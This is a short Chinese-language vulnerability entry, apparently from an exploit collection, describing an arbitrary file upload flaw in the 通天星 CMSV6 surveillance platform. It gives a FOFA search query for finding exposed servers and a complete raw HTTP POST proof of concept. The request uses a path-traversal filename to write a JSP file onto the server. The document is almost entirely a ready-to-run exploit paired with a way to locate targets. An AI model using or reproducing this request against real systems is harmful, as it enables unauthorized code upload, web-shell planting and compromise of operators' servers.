## 通天星-CMSV6-inspect_file-upload存在任意文件上传漏洞


## fofa
```
body="./open/webApi.html"||body="/808gps/"
```

## poc
```
POST /inspect_file/upload HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 226
Content-Type: multipart/form-data; boundary=2e7688d712bcc913201f327059f9976b

--2e7688d712bcc913201f327059f9976b
Content-Disposition: form-data; name="uploadFile"; filename="../707140.jsp"
Content-Type: application/octet-stream

<% out.println("007319607"); %>
--2e7688d712bcc913201f327059f9976b--
```

![image-20240524224902984](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405242249085.png)
